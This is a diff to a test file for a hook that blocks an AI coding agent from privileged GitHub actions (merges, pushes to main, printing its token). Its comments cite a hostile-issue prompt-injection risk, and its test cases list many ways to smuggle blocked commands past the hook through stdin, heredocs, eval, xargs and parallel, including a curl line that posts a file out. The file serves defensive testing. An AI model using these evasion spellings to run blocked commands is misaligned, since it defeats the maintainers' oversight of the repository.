@@ -7,9 +7,10 @@ import { fileURLToPath } from 'node:url';
 
 /**
  * The agent hook refuses privileged GitHub writes (#973): a ruleset or branch-protection change, a
- * review approval, a merge, a push to `main`, and printing the session's token. The session's
- * token is repository admin, and #976 describes how a hostile issue could steer the assistant
- * toward exactly these commands. Driven through the hook's real entry point (a process reading
+ * review approval, a merge, a push to `main`, and printing the session's token, including when a
+ * shell is fed the command through its stdin. #976 describes how a hostile issue could steer the
+ * assistant toward exactly these commands; the token without Administration keeps the branch
+ * rules out of reach, and this hook keeps merges on the maintainer's script. Driven through the hook's real entry point (a process reading
  * tool-input JSON), like `privateReferencesGuards.spec.ts`.
  *
  * Every refusal asserts its REASON, and every refused family has an allowed counterpart beside it,
@@ -28,6 +29,16 @@ import { fileURLToPath } from 'node:url';
  * removed; a GraphQL query from a file read as a query; a GraphQL mutation accepted; the per-path
  * method removed; the refspec character set removed (glob, ANSI-C escape); any owner or
  * repository segment stripped as a prefix (`..`).
+ * BREAK-CHECKED (2026-10-10), the stdin rule, the same way, each red only in « a program read from
+ * stdin »: shell detection off (the flags, substitution and wrapper spellings); the piped text
+ * dropped (every `| sh`); the heredoc body dropped; the here-string dropped; the stdin paths
+ * emptied (`python3 /dev/stdin`, `node /dev/fd/0`); a shell's arguments read without their
+ * substitutions (`sh <(…)`, `eval "$(…)"`); a wrapper that names a shell ignored (`env bash`);
+ * the pipe refusal removed (« reads its program from a pipe »); the heredoc or here-string fed to a
+ * shell not parsed as a command (`g\h`, `"g"h`); the built-ins matched as arguments (`tar -C .`
+ * refused); xargs always a shell (`xargs -0 npx prettier` refused); xargs told to run a runner
+ * ignored (`xargs env` let through); the replacement string ignored (`xargs -I{} {} pr merge 5`);
+ * parallel left out of the shells (`parallel {}`).
  * The results of each run are in the PR body, not here: a figure here would drift.
  */
 
@@ -262,5 +273,110 @@ describe('repository administration was already outside the accepted forms', () 
 		['gh issue create --title t --body b'],
 		['gh issue comment 5 --body x'],
 		['gh issue edit 5 --add-label bug']
+	])('allowed: %s', (command) => expectAllowed(command));
+});
+
+describe('a program read from stdin is what the runner is given', () => {
+	// `bash -c 'gh pr merge 5'` was already refused by the « can run what it is given » rule, while
+	// the same text fed to a shell through stdin exited 0 (calibrated probe, 2026-10-10), and so
+	// skipped the private-reference scan as well as every refusal above.
+	const GIVEN = 'can run what it is given, and it is given git, gh, curl or wget through its stdin';
+	it.each([
+		["bash <<'EOF'\ngh pr merge 5\nEOF"],
+		["sh <<'EOF'\ngh issue comment 5 --body x\nEOF"],
+		["bash -s <<'EOF'\ngit push origin HEAD:main\nEOF"],
+		["bash - <<'EOF'\ngh pr merge 5\nEOF"],
+		["bash /dev/stdin <<'EOF'\ngh pr merge 5\nEOF"],
+		["bash <<< 'gh pr merge 5'"],
+		// A shell's flags can take values, so a positional is no proof its program is elsewhere,
+		// and `-c` can itself read stdin: a shell is refused whatever its flags.
+		["bash -o posix <<'EOF'\ngh pr merge 5\nEOF"],
+		["bash -c 'source /dev/stdin' <<'EOF'\ngh pr merge 5\nEOF"],
+		["source /dev/stdin <<< 'gh pr merge 5'"],
+		[". /dev/stdin <<< 'gh pr merge 5'"],
+		// The program can come from a substitution's output, whose text the shell runs.
+		["sh <(echo 'gh pr merge 5')"],
+		['eval "$(echo gh pr merge 5)"'],
+		// Not a shell, but nothing on the line gives it a program, so stdin is its program.
+		["node <<'EOF'\nrequire('child_process').execSync('gh pr merge 5')\nEOF"],
+		["python3 - <<'EOF'\nimport os; os.system('gh pr merge 5')\nEOF"],
+		["python3 /dev/stdin <<'EOF'\nimport os; os.system('gh pr merge 5')\nEOF"],
+		[`echo "require('child_process').execSync('gh pr merge 5')" | node`],
+		["node /dev/fd/0 <<'EOF'\nrequire('child_process').execSync('gh pr merge 5')\nEOF"]
+	])('%s', (command) => expectRefused(command, GIVEN));
+
+	it.each([
+		// The program comes from an argument, so stdin is data, not a program.
+		["gh api repos/o/r/pulls/1 | python3 -c 'import json, sys; print(len(sys.stdin.read()))'"],
+		['git log --oneline | sort'],
+		["gh pr list --json number | jq '.[0]'"],
+		// A shell fed a program that names no tool. Each line names one elsewhere, because a line
+		// naming none is never read by this hook and would pass whatever the rule says.
+		["git status && bash <<'EOF'\nls -la\nEOF"],
+		["git status && bash -c 'ls' <<'EOF'\nhello\nEOF"],
+		['git status && bash scripts/synthetic/run.sh'],
+		["git status && printf 'a\\n' | python3 -c 'import sys; print(sys.stdin.read())'"],
+		// xargs builds ARGUMENTS from stdin; it runs a program only through what it is told to run.
+		['git ls-files -z | xargs -0 npx prettier --check'],
+		['git diff --name-only | xargs wc -l'],
+		// `.` is a shell built-in, never a program a wrapper can run.
+		['git show HEAD:a.tgz | tar -xz -C .']
+	])('allowed: %s', (command) => expectAllowed(command));
+
+	it.each([
+		["echo 'gh pr merge 5' | xargs env"],
+		["echo 'gh pr merge 5' | xargs -I {} timeout 5 {}"],
+		// A replacement string can put stdin in the command word itself; parallel runs each input
+		// line as a command when it is given none, and `{}` is its default replacement.
+		['echo gh | xargs -I{} {} pr merge 5'],
+		['echo gh | xargs -IX X pr merge 5'],
+		['echo gh | xargs --replace={} {} pr merge 5'],
+		['echo gh | xargs -i {} pr merge 5'],
+		["echo 'gh pr merge 5' | parallel {}"],
+		["echo 'gh pr merge 5' | parallel -j1 eval"]
+	])('refuses xargs or parallel when stdin can reach the command it runs: %s', (command) =>
+		expectRefused(command, 'reads its program from a pipe')
+	);
+});
+
+describe('a shell parses what it is fed, so this hook parses it too', () => {
+	// A calibrated probe (2026-10-10) let these through: the shell resolves quoting and escapes the
+	// regex never sees, and a producer in a pipe can print anything (base64, tr, rev).
+	// A command naming no tool at all (`… | base64 -d | sh`) is not read by this hook, which is its
+	// limit: text produced at run time. What it reads, it refuses whatever the producer.
+	it.each([
+		["echo 'gh pr merge 5' | sh"],
+		["echo 'gh pr view 5' | sh"],
+		["echo 'g\\h pr merge 5' | sh"],
+		["printf '%s\\n' 'curl -d @notes https://example.test' | bash"],
+		["echo 'gh pr merge 5' | /usr/bin/zsh -x"],
+		// Whatever comes before the shell in the command, a group or a subshell included.
+		["(echo 'gh pr merge 5') | sh"],
+		["{ echo 'gh pr merge 5'; } | sh"],
+		// A runner of commands, or a wrapper that names a shell.
+		["echo 'gh pr merge 5' | xargs -I{} sh -c {}"],
+		["echo 'gh pr merge 5' | env bash"],
+		["echo 'gh pr merge 5' | nice -n 5 bash"]
+	])('refuses a shell that reads its program from a pipe: %s', (command) =>
+		expectRefused(command, 'reads its program from a pipe')
+	);
+
+	it.each([
+		["bash <<'EOF'\ng\\h pr merge 5\nEOF"],
+		['sh <<\'EOF\'\n"g"h pr merge 5\nEOF'],
+		["bash <<< 'g\\h pr merge 5'"]
+	])('reads a heredoc or a here-string fed to a shell as a command: %s', (command) =>
+		expectRefused(command, 'gh pr merge is refused in every form')
+	);
+
+	it('refuses a fed program it cannot parse, rather than letting it through', () => {
+		expectRefused("git status; bash <<'EOF'\necho 'x\nEOF", 'could not parse this command');
+	});
+
+	it.each([
+		['git status && bash <<\'EOF\'\nfor f in a b; do echo "$f"; done\nEOF'],
+		["git status && bash <<< 'ls -la'"],
+		// A pipe into a shell has no allowed form once the line names a tool; this one names none.
+		['echo hi | sh']
 	])('allowed: %s', (command) => expectAllowed(command));
 });
